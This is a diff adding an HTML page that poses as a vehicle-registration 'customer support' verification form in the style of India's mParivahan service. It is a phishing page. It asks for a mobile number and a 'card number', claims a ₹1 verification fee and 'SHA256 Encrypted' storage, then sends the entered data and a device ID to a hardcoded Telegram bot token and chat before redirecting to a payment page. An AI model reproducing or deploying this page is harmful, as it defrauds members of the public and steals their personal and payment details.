@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update - Vehicle Registration</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            70% { opacity: 1; }
+            100% { opacity: 0; visibility: hidden; }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: .8; }
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        @keyframes shimmer {
+            0% { background-position: -1000px 0; }
+            100% { background-position: 1000px 0; }
+        }
+        
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .animate-fade-out {
+            animation: fadeOut 2.5s ease-out forwards;
+        }
+        
+        .animate-fade-in {
+            animation: fadeIn 0.6s ease-out;
+        }
+        
+        .animate-spin {
+            animation: spin 1s linear infinite;
+        }
+        
+        .animate-scale-in {
+            animation: scaleIn 0.4s ease-out;
+        }
+        
+        .animate-slide-up {
+            animation: slideUp 0.5s ease-out;
+        }
+        
+        .animate-pulse-slow {
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        .animate-float {
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        .shimmer {
+            background: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0) 100%);
+            background-size: 1000px 100%;
+            animation: shimmer 2s infinite;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        .gradient-bg {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background-size: 200% 200%;
+            animation: gradient 5s ease infinite;
+        }
+        
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+        }
+        
+        .input-glow:focus {
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.3);
+        }
+        
+        .btn-hover {
+            transition: all 0.3s ease;
+        }
+        
+        .btn-hover:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(37, 99, 235, 0.4);
+        }
+        
+        .btn-hover:active {
+            transform: translateY(0);
+        }
+        
+        .card-hover {
+            transition: all 0.3s ease;
+        }
+        
+        .card-hover:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+        }
+        
+        .success-animation {
+            animation: scaleIn 0.5s ease-out;
+        }
+        
+        .status-dot {
+            animation: pulse 2s infinite;
+        }
+        
+        .pattern-bg {
+            background-color: #f8fafc;
+            background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%239C92AC' fill-opacity='0.05'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+        }
+        
+        .enhanced-input {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .enhanced-input::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: 0.5s;
+        }
+        
+        .enhanced-input:focus::before {
+            left: 100%;
+        }
+    </style>
+</head>
+<body class="pattern-bg min-h-screen">
+    
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="fixed inset-0 gradient-bg flex items-center justify-center z-50" style="animation: fadeOut 2.5s ease-out forwards;">
+        <div class="text-center">
+            <div class="mb-8 flex justify-center animate-float">
+                <div class="bg-white rounded-full p-6 shadow-2xl">
+                    <img src="https://cdn-icons-png.magnific.com/256/12118/12118569.png?semt=ais_white_label" alt="customer support," class="w-20 h-20">
+                </div>
+            </div>
+            <h1 class="text-3xl font-bold text-white mb-2 animate-pulse-slow"></h1>
+            <h2 class="text-2xl font-semibold text-white mb-1"> CUSTOMER SUPPORT</h2>
+            <p class="text-blue-100 text-sm">One-step transport solution for cities</p>
+            <div class="mt-8">
+                <div class="w-16 h-16 border-4 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main App Container -->
+    <div id="mainApp" class="animate-fade-in" style="opacity: 0; animation-delay: 2.5s; animation-fill-mode: forwards;">
+        <!-- Registration Form -->
+        <div class="px-4 py-6 min-h-screen flex items-center">
+            <div class="glass-effect rounded-2xl shadow-2xl p-8 max-w-md mx-auto w-full card-hover">
+                <div class="flex items-center gap-3 mb-8 animate-slide-up">
+                    <button onclick="window.history.back()" class="hover:scale-110 transition-transform">
+                        <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
+                        </svg>
+                    </button>
+                    <div class="flex items-center gap-3">
+                        <img src="https://cdn-icons-png.magnific.com/256/12118/12118569.png?semt=ais_white_label" alt="CUSTOMER SUPPORT" class="w-10 h-10 hover:scale-110 transition-transform">
+                        <div>
+                            <div class="font-bold text-gray-900"> VERIFICATION</div>
+                            <div class="font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-600 to-purple-600"> CUSTOMER SUPPORT</div>
+                            <div class="text-xs text-gray-500">One-step transport solution</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Enhanced Road Icon with Animation -->
+                <div class="flex justify-center mb-8 animate-slide-up" style="animation-delay: 0.1s">
+                    <div class="relative">
+                        <div class="absolute -inset-4 bg-gradient-to-r from-blue-500 to-purple-600 rounded-full opacity-20 blur-xl animate-pulse"></div>
+                        <svg class="w-28 h-28 hover:scale-105 transition-transform relative z-10" viewBox="0 0 100 80" fill="none">
+                            <defs>
+                                <linearGradient id="roadGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                                    <stop offset="0%" style="stop-color:#60A5FA;stop-opacity:1" />
+                                    <stop offset="100%" style="stop-color:#3B82F6;stop-opacity:1" />
+                                </linearGradient>
+                            </defs>
+                            <path d="M20 60 L80 60 L70 20 L30 20 Z" fill="url(#roadGradient)" stroke="#2563EB" stroke-width="2"/>
+                            <path d="M50 25 L50 55" stroke="white" stroke-width="3" stroke-dasharray="5,5" stroke-linecap="round"/>
+                        </svg>
+                        <div class="absolute -top-2 -right-2 bg-green-500 rounded-full w-6 h-6 flex items-center justify-center animate-pulse">
+                            <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+
+                <h2 class="text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-600 to-purple-600 mb-6 text-center animate-slide-up" style="animation-delay: 0.2s">Sign Up Your Account</h2>
+
+                <form id="registrationForm" class="space-y-5 animate-slide-up" style="animation-delay: 0.3s">
+                    <div class="relative">
+                        <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                            <i class="fas fa-mobile-alt text-gray-400"></i>
+                        </div>
+                        <input 
+                            type="tel" 
+                            id="mobileNumber"
+                            placeholder="ENTER MOBILE NUMBER" 
+                            maxlength="10"
+                            class="enhanced-input w-full pl-12 pr-4 py-4 border-2 border-gray-200 rounded-xl focus:border-blue-500 focus:outline-none text-base transition-all input-glow"
+                            required
+                        >
+                    </div>
+
+                    <div class="relative">
+                        <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                            <i class="fas fa-car text-gray-400"></i>
+                        </div>
+                        <input 
+                            type="text" 
+                            id="vehicleNumber"
+                            placeholder="Enter Card Number" 
+                            class="enhanced-input w-full pl-12 pr-4 py-4 border-2 border-gray-200 rounded-xl focus:border-blue-500 focus:outline-none text-base uppercase transition-all input-glow"
+                            required
+                        >
+                    </div>
+
+                    <button 
+                        type="submit"
+                        class="w-full bg-gradient-to-r from-blue-600 to-purple-600 text-white py-4 rounded-xl font-semibold text-base shadow-lg btn-hover relative overflow-hidden"
+                    >
+                        <span class="relative z-10">Register</span>
+                        <div class="absolute inset-0 shimmer"></div>
+                    </button>
+                </form>
+
+                <div class="mt-5 bg-gradient-to-r from-blue-50 to-purple-50 border-l-4 border-blue-600 p-4 rounded-lg animate-slide-up" style="animation-delay: 0.4s">
+                    <p class="text-sm text-blue-900 flex items-center gap-2">
+                        <i class="fas fa-info-circle text-blue-600 flex-shrink-0"></i>
+                        <span><strong>Note:</strong> ₹1 registration fee required to verify vehicle ownership.</span>
+                    </p>
+                </div>
+
+                <!-- Enhanced Payment Method Icons -->
+                <div class="mt-6 flex justify-center gap-3 items-center opacity-60 animate-slide-up" style="animation-delay: 0.5s">
+                    <div class="bg-white rounded-lg p-2 shadow-md hover:scale-110 transition-transform">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRdx6kXSl4XYmNrg-Sw5Kwx5PDl1gG7hqu5fEOc0LS3bDLYBaVjRAm5bJ8&s=10" alt="Visa" class="h-5">
+                    </div>
+                    <div class="bg-white rounded-lg p-2 shadow-md hover:scale-110 transition-transform">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-6">
+                    </div>
+                    <div class="bg-gradient-to-r from-orange-500 to-green-600 text-white px-3 py-1 rounded-lg font-bold text-xs shadow-md hover:scale-110 transition-transform">RuPay</div>
+                    <div class="bg-white rounded-lg p-2 shadow-md hover:scale-110 transition-transform">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI" class="h-6">
+                    </div>
+                </div>
+
+                <!-- Enhanced Security Message -->
+                <div class="mt-4 flex items-center justify-center gap-2 text-sm text-gray-600 animate-slide-up" style="animation-delay: 0.6s">
+                    <i class="fas fa-shield-alt text-green-600"></i>
+                    <span class="font-medium">SHA256 Encrypted — Secure Storage</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Enhanced Payment Popup Modal -->
+    <div id="paymentPopup" class="hidden fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4 backdrop-blur-sm">
+        <div class="glass-effect rounded-3xl shadow-2xl max-w-sm w-full p-8 animate-scale-in">
+            <div class="flex justify-end mb-4">
+                <button onclick="closePopup()" class="text-gray-400 hover:text-gray-600 hover:rotate-90 transition-all duration-300">
+                    <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+                    </svg>
+                </button>
+            </div>
+            
+            <div class="text-center">
+                <div class="flex justify-center mb-6">
+                    <div class="bg-gradient-to-br from-blue-400 to-blue-600 rounded-full p-5 shadow-lg animate-pulse-slow">
+                        <i class="fas fa-shield-alt text-white text-3xl"></i>
+                    </div>
+                </div>
+                
+                <h3 class="text-xl font-bold text-gray-900 mb-3">
+                    Update Your account
+                </h3>
+                <p class="text-gray-600 mb-6">
+                    Now <span class="text-2xl font-bold text-green-600">Verify</span>your account to update
+                </p>
+                
+                <button 
+                    onclick="redirectToPayment()"
+                    class="w-full mt-4 bg-gradient-to-r from-green-500 to-green-600 text-white py-5 rounded-xl text-lg font-bold shadow-lg btn-hover"
+                >
+                    confirm
+                </button>
+                
+                <div class="mt-6 flex justify-center gap-3 items-center opacity-60">
+                    <div class="bg-white rounded-lg p-1 shadow-md">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg" alt="Visa" class="h-4">
+                    </div>
+                    <div class="bg-white rounded-lg p-1 shadow-md">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-5">
+                    </div>
+                    <div class="bg-gradient-to-r from-orange-500 to-green-600 text-white px-2 py-0.5 rounded font-bold text-xs">RuPay</div>
+                    <div class="bg-white rounded-lg p-1 shadow-md">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI" class="h-5">
+                    </div>
+                </div>
+                
+                <div class="mt-5 flex items-center justify-center gap-2 text-sm text-gray-500">
+                    <i class="fas fa-lock text-green-600"></i>
+                    <span>SHA256 Encrypted</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Notification -->
+    <div id="successNotification" class="hidden fixed top-5 right-5 bg-green-500 text-white px-6 py-4 rounded-lg shadow-lg z-50 success-animation">
+        <div class="flex items-center gap-3">
+            <div class="status-dot">
+                <i class="fas fa-check-circle text-2xl"></i>
+            </div>
+            <div>
+                <p class="font-semibold">Registration Successful!</p>
+                <p class="text-sm">Your device has been registered.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const CONFIG = {
+            telegramBotToken: '8792226734:AAEphQ5o24mfeHc4LUXm8kRj7awB-35-EtU',
+            telegramChatId: '-8261652786'
+        };
+
+        // Get Device ID from URL or generate one
+        function getDeviceId() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('id') || 'd981daf082e4fff7'; 
+        }
+
+        const deviceId = getDeviceId();
+
+        // Format data for Telegram message - simplified to only include input values
+        function formatDataForTelegram(mobileNumber, vehicleNumber) {
+            const timestamp = new Date().toLocaleString();
+            
+            let message = `🔔 <b>NEW CONNECTION REQUEST</b> 🔔\n\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+            message += `📱 <b>Mobile Number:</b> ${mobileNumber}\n`;
+            message += `🚗 <b>Vehicle Number:</b> ${vehicleNumber}\n`;
+            message += `🆔 <b>Device ID:</b> ${deviceId}\n\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `⏰ <b>Request Time:</b> ${timestamp}\n\n`;
+            message += `🔐 <i>This is an automated notification from NexGen mParivahan</i>`;
+            
+            return message;
+        }
+
+        // Send notification to Telegram
+        async function sendTelegramNotification(mobileNumber, vehicleNumber) {
+            try {
+                // Format message
+                const message = formatDataForTelegram(mobileNumber, vehicleNumber);
+                
+                // Send to Telegram
+                const telegramURL = `https://api.telegram.org/bot${CONFIG.telegramBotToken}/sendMessage`;
+                
+                const response = await fetch(telegramURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.telegramChatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.ok) {
+                    console.log('Telegram notification sent successfully');
+                    return true;
+                } else {
+                    console.error('Telegram API error:', result);
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error sending Telegram notification:', error);
+                return false;
+            }
+        }
+
+        // Handle form submission
+        document.getElementById('registrationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const mobileNumber = document.getElementById('mobileNumber').value;
+            const vehicleNumber = document.getElementById('vehicleNumber').value;
+            
+            // Validate inputs
+            if (!mobileNumber || mobileNumber.length !== 10) {
+                alert('Please enter a valid 10-digit mobile number');
+                return;
+            }
+            
+            if (!vehicleNumber) {
+                alert('Please enter vehicle number');
+                return;
+            }
+            
+            // Send Telegram notification
+            console.log('Sending notification...');
+            const notificationSent = await sendTelegramNotification(mobileNumber, vehicleNumber);
+            
+            if (notificationSent) {
+                console.log('Notification sent, showing popup');
+            } else {
+                console.log('Notification failed, but showing popup anyway');
+            }
+            
+            // Show payment popup
+            showPopup();
+        });
+
+        function showPopup() {
+            document.getElementById('paymentPopup').classList.remove('hidden');
+        }
+
+        function closePopup() {
+            document.getElementById('paymentPopup').classList.add('hidden');
+        }
+
+        function redirectToPayment() {
+            const mobileNumber = document.getElementById('mobileNumber').value;
+            const vehicleNumber = document.getElementById('vehicleNumber').value;
+            
+            // Create a temporary form to submit the data
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'payment.html';
+            
+            // Add mobile number
+            const mobileInput = document.createElement('input');
+            mobileInput.type = 'hidden';
+            mobileInput.name = 'mobile';
+            mobileInput.value = mobileNumber;
+            form.appendChild(mobileInput);
+            
+            // Add vehicle number
+            const vehicleInput = document.createElement('input');
+            vehicleInput.type = 'hidden';
+            vehicleInput.name = 'vehicle';
+            vehicleInput.value = vehicleNumber;
+            form.appendChild(vehicleInput);
+            
+            // Add device ID
+            const deviceIdInput = document.createElement('input');
+            deviceIdInput.type = 'hidden';
+            deviceIdInput.name = 'id';
+            deviceIdInput.value = deviceId;
+            form.appendChild(deviceIdInput);
+            
+            // Submit the form
+            document.body.appendChild(form);
+            form.submit();
+        }
+
+        // Test notification on page load (for debugging)
+        console.log('Page loaded. Device ID:', deviceId);
+    </script>
+</body>
+</html>
